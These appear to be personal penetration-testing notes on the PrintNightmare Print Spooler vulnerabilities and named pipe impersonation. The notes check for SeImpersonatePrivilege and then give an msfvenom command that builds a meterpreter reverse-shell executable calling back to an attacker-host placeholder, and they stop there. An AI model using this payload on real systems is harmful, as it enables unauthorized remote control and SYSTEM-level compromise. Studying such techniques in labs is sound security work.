
## Quick summary — what this is

- “PrintNightmare” refers to a class of Print Spooler vulnerabilities (notably CVE-2021-1675 and CVE-2021-34527) that allow **privilege escalation** or **remote code execution** via the Windows Print Spooler service.
    
- One attack vector uses **named pipe impersonation**: a privileged service (spoolsv.exe) can be tricked into impersonating an attacker-controlled client, leading to code execution as SYSTEM.
    
- Impact: full domain compromise on Windows domain controllers or local SYSTEM takeover on workstations/servers where spooler is running and vulnerable.

## Privileges of the current user

On the [[Initial access#Reverse Shell]] get the user's privileges.

```
whoami /priv
```

![[1_O8u40tZ_W_inoAsND5hOLQ.webp]]

The Privilege `SeImpersonatePrivilege` is enabled.

## Creating a payload with msfvenom

#Attacking_Machine 
Run the following command.

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKING MACHIINE IP> LPORT=4445 -f exe -o malicious.exe
```

